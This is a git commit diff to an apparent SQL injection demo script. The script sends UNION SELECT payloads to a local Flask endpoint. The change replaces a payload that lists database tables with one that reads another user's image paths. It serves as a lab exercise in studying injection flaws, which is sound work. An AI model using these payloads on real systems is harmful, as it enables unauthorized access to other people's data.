59c6d1e40c127e106eab45550fb073288606a9f2
fawzi <mahmoud.fawzi@dhc-vision.com>
2022-02-03 14:51:22 +0100

    perform injection updated

--- flask_sql_injection/perform_injection.py
+++ flask_sql_injection/perform_injection.py
@@ -15,6 +15,6 @@ res = requests.get("http://127.0.0.1:5000/select-image", params=parameters)
 print(res.json())
 
 #Query with Injection
-injection_parameters = {"user_id" : "1234567890 AND 2=1 UNION SELECT name FROM sqlite_master"}
+injection_parameters = {"user_id" : "1234567890 AND 2=1 UNION SELECT image_path from images Where user_id=9999999999"}
 res = requests.get("http://127.0.0.1:5000/select-image", params=injection_parameters)
 print(res.json())
